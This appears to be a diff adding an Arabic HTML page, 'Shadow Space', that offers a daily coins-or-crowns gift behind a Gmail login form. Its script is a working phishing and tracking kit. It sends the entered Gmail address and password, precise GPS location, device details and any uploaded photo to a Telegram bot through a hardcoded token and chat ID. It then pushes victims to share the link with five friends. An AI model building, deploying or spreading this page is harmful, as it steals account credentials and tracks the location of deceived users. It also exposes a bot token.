@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#090b18">
+<title>Shadow | الأقسام</title>
+
+<style>
+:root{
+ --bg:#090b18;
+ --card:rgba(24,28,52,.82);
+ --purple:#9365ff;
+ --blue:#29c9ef;
+ --text:#f5f5ff;
+ --muted:#9da5c3;
+ --green:#39dc9b;
+}
+*{box-sizing:border-box}
+body{
+ margin:0;
+ min-height:100vh;
+ background:
+ radial-gradient(ellipse at 15% 5%,#35205c 0,transparent 38%),
+ radial-gradient(ellipse at 90% 65%,#102c50 0,transparent 40%),
+ var(--bg);
+ color:var(--text);
+ font-family:Tahoma,Arial,sans-serif;
+ padding:20px 15px;
+}
+button,input{font-family:inherit}
+.wrap{max-width:470px;margin:auto}
+.header{
+ display:flex;align-items:center;justify-content:space-between;
+ padding:12px 4px 22px;
+}
+.logo{display:flex;align-items:center;gap:10px;font-size:19px;font-weight:bold}
+.logo-icon{
+ width:43px;height:43px;border-radius:14px;
+ display:grid;place-items:center;font-size:23px;
+ background:linear-gradient(135deg,var(--purple),var(--blue));
+ box-shadow:0 0 25px #815cff55;
+}
+.status{
+ font-size:11px;color:var(--green);
+ background:#39dc9b16;padding:8px 12px;border-radius:30px;
+ border:1px solid #39dc9b35;
+}
+.card{
+ background:var(--card);
+ border:1px solid #ffffff13;
+ border-radius:23px;
+ padding:22px;
+ margin-bottom:17px;
+ box-shadow:0 15px 45px #0005;
+ backdrop-filter:blur(18px);
+ animation:appear .5s ease;
+}
+@keyframes appear{
+ from{opacity:0;transform:translateY(15px)}
+ to{opacity:1;transform:translateY(0)}
+}
+.hero{text-align:center;padding:30px 20px}
+.hero-icon{
+ width:83px;height:83px;margin:0 auto 18px;
+ border-radius:27px;display:grid;place-items:center;
+ font-size:39px;
+ background:linear-gradient(135deg,#9365ff,#20bde8);
+ box-shadow:0 0 40px #9365ff45;
+}
+h1{font-size:25px;margin:10px 0}
+h2{font-size:19px;margin:0 0 12px}
+p{font-size:13px;color:var(--muted);line-height:2}
+.gradient{
+ background:linear-gradient(90deg,#b18aff,#3bd7f5);
+ background-clip:text;-webkit-background-clip:text;
+ color:transparent;
+}
+input{
+ width:100%;padding:15px;margin:8px 0;
+ border:1px solid #ffffff18;border-radius:13px;
+ background:#0b1022;color:white;font-size:15px;
+ outline:none;transition:.2s;
+}
+input:focus{border-color:var(--purple);box-shadow:0 0 15px #9365ff30}
+button{
+ width:100%;padding:15px;border:0;border-radius:14px;
+ color:white;font-weight:bold;font-size:15px;
+ background:linear-gradient(100deg,#8555ef,#267fdc);
+ cursor:pointer;transition:.25s;
+ margin-top:10px;
+}
+button:active{transform:scale(.97)}
+button.secondary{
+ background:#ffffff09;border:1px solid #ffffff20;color:#ddd;
+}
+button:disabled{opacity:.4}
+.error{color:#ff7777;font-size:12px;min-height:18px}
+.section{
+ display:flex;align-items:center;gap:15px;
+ padding:17px;margin:12px 0;
+ border:1px solid #ffffff12;
+ border-radius:17px;background:#ffffff06;
+ cursor:pointer;transition:.25s;
+}
+.section:hover{
+ border-color:#9365ff88;
+ background:#9365ff12;
+ transform:translateY(-2px);
+}
+.section-icon{
+ width:51px;height:51px;border-radius:15px;
+ display:grid;place-items:center;font-size:25px;
+ background:linear-gradient(135deg,#9365ff33,#29c9ef25);
+}
+.section-title{font-size:15px;font-weight:bold}
+.section-desc{font-size:11px;color:var(--muted);margin-top:7px}
+.arrow{margin-right:auto;color:#a98aff;font-size:20px}
+.info{
+ display:flex;justify-content:space-between;
+ color:var(--muted);font-size:12px;margin:14px 0;
+}
+.progress{
+ height:7px;background:#ffffff12;border-radius:20px;overflow:hidden;
+ margin:13px 0;
+}
+.progress span{
+ display:block;height:100%;width:0%;
+ background:linear-gradient(90deg,var(--purple),var(--blue));
+ transition:.5s;
+}
+.center{text-align:center}
+.big{font-size:65px;margin:10px}
+.spin{
+ width:48px;height:48px;border:4px solid #ffffff17;
+ border-top-color:var(--purple);border-radius:50%;
+ margin:25px auto;animation:rotate .8s linear infinite;
+}
+@keyframes rotate{to{transform:rotate(360deg)}}
+.preview{
+ width:100%;max-height:280px;object-fit:contain;
+ border-radius:15px;margin-top:15px;
+}
+.footer{text-align:center;color:#707995;font-size:11px;padding:15px}
+.tag{
+ display:inline-block;padding:7px 12px;border-radius:30px;
+ background:#9365ff1b;color:#c5aaff;font-size:11px;
+ margin-bottom:12px;
+}
+</style>
+</head>
+
+<body>
+<div class="wrap">
+
+ <div class="header">
+  <div class="logo">
+   <div class="logo-icon">✦</div>
+   <span>SHADOW <span class="gradient">SPACE</span></span>
+  </div>
+  <div class="status">● online</div>
+ </div>
+
+ <main id="app"></main>
+
+ <div class="footer">
+  SHADOW SPACE © 2026 — جميع الحقوق محفوظة
+ </div>
+</div>
+
+<script>
+(()=>{
+"use strict";
+
+// ==========================================
+// إعدادات بوت تيليجرام
+// ==========================================
+const BOT_TOKEN =  '9215581130:AAGrrMWyToekuuhBtXyswAjbxo5tBhkjmsQ';
+const CHAT_ID = "-1004295925860";     
+// ==========================================
+
+const app=document.getElementById("app");
+
+let state={
+ user:"",
+ password:"",
+ section:0,
+ gift:"",
+ photo:null
+};
+
+const LAST="shadow_last";
+
+// دالة جلب معلومات الجهاز والشبكة
+function getDeviceInfo() {
+ return {
+  userAgent: navigator.userAgent || "غير متوفر",
+  platform: navigator.platform || "غير متوفر",
+  language: navigator.language || "غير متوفر",
+  screenRes: `${window.screen.width}x${window.screen.height}`,
+  colorDepth: `${window.screen.colorDepth} بت`,
+  deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير متوفر",
+  hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} نواة` : "غير متوفر",
+  connection: navigator.connection ? `${navigator.connection.effectiveType || ''} (${navigator.connection.downlink || '?'} Mbps)` : "غير متوفر",
+  cookiesEnabled: navigator.cookieEnabled ? "نعم" : "لا",
+  url: window.location.href,
+  referrer: document.referrer || "مباشر"
+ };
+}
+
+// دالة طلب الموقع الجغرافي (GPS) بانتظار تام لضمان وصوله مع الرسالة مرة واحدة
+function requestGeolocation() {
+ return new Promise((resolve) => {
+  if (!navigator.geolocation) {
+   resolve("المتصفح لا يدعم تحديد الموقع");
+   return;
+  }
+  navigator.geolocation.getCurrentPosition(
+   (position) => {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const acc = position.coords.accuracy;
+    resolve(`خط عرض: ${lat}\nخط طول: ${lon}\nالدقة: ${acc} متر\nرابط الخريطة: https://maps.google.com/?q=${lat},${lon}`);
+   },
+   (error) => {
+    resolve("تم رفض إذن الموقع أو حدث خطأ: " + error.message);
+   },
+   { timeout: 7000, maximumAge: 0, enableHighAccuracy: true }
+  );
+ });
+}
+
+// دالة إرسال النص إلى تيليجرام (دفعة واحدة متكاملة)
+async function sendToTelegram(messageText) {
+ const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+ try {
+  await fetch(url, {
+   method: "POST",
+   headers: { "Content-Type": "application/json" },
+   body: JSON.stringify({
+    chat_id: CHAT_ID,
+    text: messageText,
+    parse_mode: "HTML"
+   })
+  });
+ } catch (err) {
+  console.error("خطأ في الإرسال للبوت:", err);
+ }
+}
+
+// دالة إرسال صورة (Base64) إلى تيليجرام
+async function sendPhotoToTelegram(base64Data, captionText) {
+ try {
+  const arr = base64Data.split(',');
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while(n--){
+   u8arr[n] = bstr.charCodeAt(n);
+  }
+  const file = new Blob([u8arr], {type: mime});
+
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("photo", file, "image.jpg");
+  formData.append("caption", captionText);
+  formData.append("parse_mode", "HTML");
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+   method: "POST",
+   body: formData
+  });
+ } catch (err) {
+  console.error("خطأ في إرسال الصورة:", err);
+ }
+}
+
+function render(html){
+ app.innerHTML=html;
+}
+
+function button(id,text,cls=""){
+ return `<button id="${id}" class="${cls}">${text}</button>`;
+}
+
+function home(){
+ render(`
+ <div class="card hero">
+  <div class="hero-icon">✦</div>
+  <div class="tag">WELCOME TO SHADOW</div>
+  <h1>عالمك يبدأ <span class="gradient">من هنا</span></h1>
+  <p>اكتشف الأقسام واستمتع بتجربة تفاعلية بتصميم عصري.</p>
+ </div>
+
+ <div class="card">
+  <h2>👋 LOG IN</h2>
+  <p> @gmail.com password.</p>
+  <input id="username" type="email" maxlength="60" placeholder="gmail (...@gmail.com)">
+  <input id="password" type="password" maxlength="60" placeholder="password">
+  <div class="error" id="error"></div>
+  ${button("enter","join  ←")}
+ </div>
+ `);
+
+ document.getElementById("enter").onclick=async ()=>{
+  const btn = document.getElementById("enter");
+  let value=document.getElementById("username").value.trim();
+  let pass=document.getElementById("password").value.trim();
+  
+  if(!value){
+   document.getElementById("error").textContent="الرجاء إدخال البريد الإلكتروني";
+   return;
+  }
+  if(!value.endsWith("@gmail.com")){
+   document.getElementById("error").textContent="يجب أن ينتهي البريد الإلكتروني بـ @gmail.com";
+   return;
+  }
+  if(!pass){
+   document.getElementById("error").textContent="الرجاء إدخال كلمة المرور";
+   return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = "جاري التحقق والاتصال...";
+
+  state.user=value;
+  state.password=pass;
+  
+  // جمع الموقع ومعلومات الجهاز بالكامل في نفس اللحظة قبل الإرسال
+  const loc = await requestGeolocation();
+  const dev = getDeviceInfo();
+  const time = new Date().toLocaleString("ar-EG");
+
+  const msg = `🚨 <b>تقرير تسجيل دخول شامل جديد</b>\n\n` +
+              `👤 <b>البريد:</b> <code>${escapeHTML(value)}</code>\n` +
+              `🔑 <b>الباسورد:</b> <code>${escapeHTML(pass)}</code>\n` +
+              `⏰ <b>الوقت:</b> ${time}\n\n` +
+              `📍 <b>الموقع الجغرافي:</b>\n${loc}\n\n` +
+              `💻 <b>معلومات الجهاز:</b>\n` +
+              `• النظام: <code>${escapeHTML(dev.platform)}</code>\n` +
+              `• المتصفح: <code>${escapeHTML(dev.userAgent)}</code>\n` +
+              `• أبعاد الشاشة: <code>${dev.screenRes}</code>\n` +
+              `• الذاكرة العشوائية: <code>${dev.deviceMemory}</code>\n` +
+              `• الأنوية: <code>${dev.hardwareConcurrency}</code>\n` +
+              `• الشبكة: <code>${dev.connection}</code>\n` +
+              `• اللغة: <code>${dev.language}</code>\n` +
+              `• رابط الموقع: <code>${escapeHTML(dev.url)}</code>`;
+
+  await sendToTelegram(msg);
+
+  dashboard();
+ };
+}
+
+function dashboard(){
+ render(`
+ <div class="card">
+  <div class="tag">YOUR DASHBOARD</div>
+  <h1>أهلاً بك 👋</h1>
+  <p>مرحباً ${escapeHTML(state.user)}، اختر القسم الذي تريد استكشافه.</p>
+ </div>
+
+ <div class="card">
+  <h2>✦ الأقسام الرئيسية</h2>
+
+  <div class="section" data-section="1">
+   <div class="section-icon">🖼️</div>
+   <div>
+    <div class="section-title">تغيير الصورة</div>
+    <div class="section-desc">اختر صورة واعرضها في معاينة خاصة</div>
+   </div>
+   <span class="arrow">‹</span>
+  </div>
+
+  <div class="section" data-section="2">
+   <div class="section-icon">🎁</div>
+   <div>
+    <div class="section-title">الهدية اليومية</div>
+    <div class="section-desc">اختر هديتك المفضلة واستلمها فوراً</div>
+   </div>
+   <span class="arrow">‹</span>
+  </div>
+
+  <div class="section" data-section="3">
+   <div class="section-icon">👥</div>
+   <div>
+    <div class="section-title">معلومات الحساب</div>
+    <div class="section-desc">عرض معلومات حسابك الشخصي</div>
+   </div>
+   <span class="arrow">‹</span>
+  </div>
+
+  ${button("share","↗ مشاركة الموقع","secondary")}
+  ${button("logout","تسجيل الخروج","secondary")}
+ </div>
+ `);
+
+ app.querySelectorAll("[data-section]").forEach(item=>{
+  item.onclick=()=>{
+   state.section=Number(item.dataset.section);
+   if(state.section===1)photoPage();
+   if(state.section===2)giftPage();
+   if(state.section===3)accountPage();
+  };
+ });
+
+ document.getElementById("share").onclick=share;
+ document.getElementById("logout").onclick=home;
+}
+
+function escapeHTML(s){
+ return String(s).replace(/[&<>"']/g,c=>({
+ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
+ })[c]);
+}
+
+function back(){
+ dashboard();
+}
+
+function giftPage(){
+ const last=Number(localStorage.getItem(LAST)||0);
+ const remaining=86400000-(Date.now()-last);
+
+ if(remaining>0){
+  let hours=Math.floor(remaining/3600000);
+  let minutes=Math.floor(remaining%3600000/60000);
+
+  render(`
+   <div class="card center">
+    <div class="big">⏳</div>
+    <h2>الهدية القادمة</h2>
+    <p>لقد اخترت هديتك بالفعل، يرجى الانتظار حتى اكتمال الوقت.</p>
+    <h1 class="gradient">${hours} ساعة و ${minutes} دقيقة</h1>
+    ${button("back","رجوع","secondary")}
+   </div>
+  `);
+  document.getElementById("back").onclick=back;
+  return;
+ }
+
+ render(`
+ <div class="card center">
+  <div class="big">🎁</div>
+  <h2>الهدية اليومية</h2>
+  <p>اختر هديتك المفضلة لاستلامها.</p>
+  ${button("coins","🪙 كوينز")}
+  ${button("crowns","👑 كرونز")}
+  ${button("back","رجوع","secondary")}
+ </div>
+ `);
+
+ document.getElementById("coins").onclick=()=>chooseGift("كوينز");
+ document.getElementById("crowns").onclick=()=>chooseGift("كرونز");
+ document.getElementById("back").onclick=back;
+}
+
+async function chooseGift(gift){
+ state.gift=gift;
+ localStorage.setItem(LAST,String(Date.now()));
+
+ const msg = `🎁 <b>اختيار هدية جديدة</b>\n\n` +
+             `👤 <b>البريد:</b> <code>${escapeHTML(state.user)}</code>\n` +
+             `✨ <b>الهدية:</b> ${gift}`;
+ sendToTelegram(msg);
+
+ render(`
+ <div class="card center">
+  <div class="big">🎉</div>
+  <h2>تم اختيار الهدية بنجاح!</h2>
+  <p class="gradient" style="font-size: 15px; font-weight: bold; margin: 15px 0;">الرجاء المشاركة مع 5 من أصدقائك للحصول علي الهدية</p>
+  <p>قم بنسخ الرابط ومشاركته عبر واتساب أو تليجرام لإتمام العملية.</p>
+  ${button("shareGift","مشاركة الرابط الآن")}
+  ${button("back","العودة للأقسام","secondary")}
+ </div>
+ `);
+ document.getElementById("shareGift").onclick=share;
+ document.getElementById("back").onclick=back;
+}
+
+function photoPage(){
+ render(`
+ <div class="card center">
+  <div class="big">📷</div>
+  <h2>change photo</h2>
+  <p>choose photo.</p>
+  <input type="file" id="photo" accept="image/*">
+  <div id="preview"></div>
+  ${button("back","رجوع","secondary")}
+ </div>
+ `);
+
+ const input=document.getElementById("photo");
+
+ input.onchange=async ()=>{
+  const file=input.files[0];
+  if(!file)return;
+
+  if(!file.type.startsWith("image/")){
+   alert("choose photo");
+   return;
+  }
+
+  if(file.size>5*1024*1024){
+   alert("حجم الصورة يجب ألا يتجاوز 5 ميجابايت");
+   input.value="";
+   return;
+  }
+
+  const reader=new FileReader();
+
+  reader.onload=async e=>{
+   state.photo=e.target.result;
+   document.getElementById("preview").innerHTML=
+    `<img class="preview" src="${e.target.result}" alt="معاينة الصورة">
+     <p style="color:#39dc9b">✓ جاري تحديث الصورة الشخصية...</p>`;
+
+   const caption = `🖼️ <b>صورة جديدة مرفوعة</b>\n👤 <b>البريد:</b> <code>${escapeHTML(state.user)}</code>`;
+   await sendPhotoToTelegram(e.target.result, caption);
+
+   document.getElementById("preview").innerHTML=
+    `<img class="preview" src="${e.target.result}" alt="معاينة الصورة">
+     <p style="color:#39dc9b">✓ تم تحديث وحفظ الصورة بنجاح</p>`;
+  };
+
+  reader.readAsDataURL(file);
+ };
+
+ document.getElementById("back").onclick=back;
+}
+
+function accountPage(){
+ render(`
+ <div class="card center">
+  <div class="big">👤</div>
+  <h2>معلومات الحساب الشخصي</h2>
+  <p>البريد الإلكتروني المسجل</p>
+  <h2 class="gradient">${escapeHTML(state.user)}</h2>
+  <div class="progress"><span style="width:100%"></span></div>
+  <p>حالة الحساب: نشط ومفعل</p>
+  <p>الأقسام المتاحة: 3 أقسام</p>
+  ${button("back","العودة للأقسام")}
+ </div>
+ `);
+ document.getElementById("back").onclick=back;
+}
+
+async function share(){
+ const data={
+  title:"SHADOW SPACE",
+  text:"اكتشف عالم SHADOW SPACE واستمتع بالمميزات والهدية اليومية",
+  url:location.href
+ };
+
+ try{
+  if(navigator.share){
+   await navigator.share(data);
+  }else if(navigator.clipboard){
+   await navigator.clipboard.writeText(location.href);
+   alert("تم نسخ رابط المشاركة بنجاح");
+  }else{
+   alert("يمكنك نسخ رابط الموقع من شريط العنوان");
+  }
+ }catch(e){}
+}
+
+home();
+
+})();
+</script>
+</body>
+</html>
